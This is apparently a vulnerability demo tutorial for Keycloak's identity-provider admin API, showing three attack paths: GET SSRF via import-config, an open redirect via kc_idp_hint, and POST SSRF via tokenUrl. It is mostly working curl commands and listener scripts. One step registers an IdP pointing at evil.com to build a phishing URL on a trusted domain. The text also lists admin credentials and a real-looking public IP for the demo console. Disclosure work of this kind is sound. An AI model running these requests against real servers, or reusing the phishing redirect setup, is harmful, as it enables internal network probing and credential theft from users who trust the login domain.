# Tutorial: Finding #4 — SSRF + Open Redirect via Identity Provider

**Severity:** HIGH (CVSS 8.0)
**Demo time:** ~10 minutes
**Requirements:** Terminal + Browser (Admin Console)
**3 Attack Paths:** GET SSRF, Open Redirect, POST SSRF

---

## Attack Scenario

An attacker who has the `manage-identity-providers` role (commonly delegated to team leads for SSO setup) can:
- **Path A:** Scan internal networks via SSRF
- **Path B:** Create a phishing URL from a trusted Keycloak domain
- **Path C:** POST sensitive data to internal services

---

## Step 0: Ensure Keycloak is Running

```bash
curl -s http://localhost:8080/realms/test | python3 -c "import sys,json; print('Keycloak OK:', json.load(sys.stdin)['realm'])"
```

---

## Step 1: Get Admin Token

```bash
ADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/realms/master/protocol/openid-connect/token \
  -d "client_id=admin-cli" \
  -d "grant_type=password" \
  -d "username=admin" \
  -d "password=Admin1234" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

echo "Token OK: ${ADMIN_TOKEN:0:30}..."
```

---

# PATH A: GET SSRF via import-config

## Step A1: Set Up HTTP Listener (Terminal 1)

Open a new terminal and run a listener to capture the SSRF request:

```bash
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f'')
        print(f'=== SSRF DETECTED! ===')
        print(f'Method: {self.command}')
        print(f'Path:   {self.path}')
        print(f'User-Agent: {self.headers.get(\"User-Agent\")}')
        print(f'========================')
        print(f'')
        self.send_response(200)
        self.send_header('Content-Type','application/json')
        self.end_headers()
        self.wfile.write(b'{\"issuer\":\"https://evil.com\"}')
    def log_message(self, *a): pass
print('Listener ready on port 49990... waiting for SSRF request...')
HTTPServer(('0.0.0.0', 49990), H).serve_forever()
"
```

## Step A2: Trigger SSRF (Terminal 2)

In another terminal, send an import-config request with `fromUrl` pointing to our listener:

```bash
ADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/realms/master/protocol/openid-connect/token \
  -d "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

curl -s -X POST \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"providerId":"oidc","fromUrl":"http://127.0.0.1:49990/.well-known/openid-configuration"}' \
  "http://localhost:8080/admin/realms/test/identity-provider/import-config" \
  | python3 -m json.tool
```

## Step A3: Check Listener (Terminal 1)

**Output on the listener:**
```
=== SSRF DETECTED! ===
Method: GET
Path:   /.well-known/openid-configuration
User-Agent: Apache-HttpClient/4.5.14 (Java/21.0.10)
========================
```

> **SSRF CONFIRMED!** Keycloak performed a server-side HTTP GET to the internal address we specified. The User-Agent shows this is a request from Java — not from the user's browser.

---

# PATH B: Open Redirect via kc_idp_hint

## Step B1: Register Malicious IdP

```bash
ADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/realms/master/protocol/openid-connect/token \
  -d "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

curl -s -o /dev/null -w "Register IdP: HTTP %{http_code}\n" -X POST \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "alias": "attacker-idp",
    "providerId": "oidc",
    "enabled": true,
    "config": {
      "authorizationUrl": "https://evil.com/fake-login",
      "tokenUrl": "https://evil.com/token",
      "clientId": "attacker-client",
      "clientSecret": "sec",
      "defaultScope": "openid email profile"
    }
  }' \
  "http://localhost:8080/admin/realms/test/identity-provider/instances"
```
Output: `Register IdP: HTTP 201`

## Step B2: Verify IdP is Registered in Admin Console

1. Open: `http://46.101.162.187:8080/admin/master/console/`
2. Login: `admin` / `Admin1234`
3. Realm **test** → **Identity providers**
4. See **attacker-idp** is registered with `authorizationUrl: https://evil.com/fake-login`

## Step B3: Create Phishing URL

This URL is 100% legitimate Keycloak — but will redirect to evil.com:

```
http://46.101.162.187:8080/realms/test/protocol/openid-connect/auth?client_id=test-public&response_type=code&redirect_uri=http://46.101.162.187:8080/realms/test/account&scope=openid&kc_idp_hint=attacker-idp
```

## Step B4: Verify Redirect

```bash
curl -si "http://46.101.162.187:8080/realms/test/protocol/openid-connect/auth?client_id=test-public&response_type=code&redirect_uri=http://46.101.162.187:8080/realms/test/account&scope=openid&kc_idp_hint=attacker-idp" \
  2>&1 | grep "Location:"
```

> Redirect chain: Keycloak domain → broker → **evil.com/fake-login**
> The victim sees a trusted Keycloak URL, but gets redirected to the attacker's phishing page.

## Step B5: Cleanup IdP (after demo)

```bash
ADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/realms/master/protocol/openid-connect/token \
  -d "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

curl -s -o /dev/null -w "Delete IdP: HTTP %{http_code}\n" -X DELETE \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8080/admin/realms/test/identity-provider/instances/attacker-idp"
```

---

# PATH C: POST SSRF via tokenUrl

## Step C1: Set Up Listener for POST (Terminal 1)

Kill the old listener first, then run:

```bash
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
class H(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode()
        print(f'')
        print(f'=== POST SSRF DETECTED! ===')
        print(f'Method: POST')
        print(f'Path:   {self.path}')
        print(f'Body:   {body}')
        print(f'User-Agent: {self.headers.get(\"User-Agent\")}')
        print(f'=============================')
        print(f'')
        self.send_response(200)
        self.send_header('Content-Type','application/json')
        self.end_headers()
        self.wfile.write(b'{\"error\":\"invalid_grant\"}')
    def log_message(self, *a): pass
print('Listener ready on port 49991... waiting for POST SSRF...')
HTTPServer(('0.0.0.0', 49991), H).serve_forever()
"
```

## Step C2: Register IdP with Internal tokenUrl

```bash
ADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/realms/master/protocol/openid-connect/token \
  -d "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

curl -s -o /dev/null -w "Register IdP: HTTP %{http_code}\n" -X POST \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "alias": "ssrf-idp",
    "providerId": "oidc",
    "enabled": true,
    "config": {
      "authorizationUrl": "https://evil.com/auth",
      "tokenUrl": "http://127.0.0.1:49991/token",
      "clientId": "attacker",
      "clientSecret": "sec",
      "defaultScope": "openid"
    }
  }' \
  "http://localhost:8080/admin/realms/test/identity-provider/instances"
```

> `tokenUrl` points to our listener at `127.0.0.1:49991` — this is the internal SSRF target.

## Step C3: Trigger POST SSRF via Broker Callback

This requires an active browser session. For a full demo, open the broker endpoint URL in a browser. Keycloak will POST to the internal tokenUrl when processing the broker callback.

> **Note:** Path C requires an active browser session. For a video demo, Path A and B are sufficient to demonstrate the vulnerability.

---

## Step 9: Run Python PoC (Automated Path A + B)

```bash
python3 pocs/poc_f4_ssrf_idp.py --host http://localhost:8080 --listen-port 49990
```

---

## Summary

| Path | Attack | Evidence | Status |
|---|---|---|---|
| A: GET SSRF | import-config fromUrl | Listener receives GET from Keycloak | VULNERABLE |
| B: Open Redirect | kc_idp_hint + authorizationUrl | Redirect to evil.com from trusted domain | VULNERABLE |
| C: POST SSRF | tokenUrl via broker callback | POST to internal address | VULNERABLE |

**Conclusion:** An attacker with the `manage-identity-providers` role can scan internal networks, phish from a trusted domain, and POST to internal services.
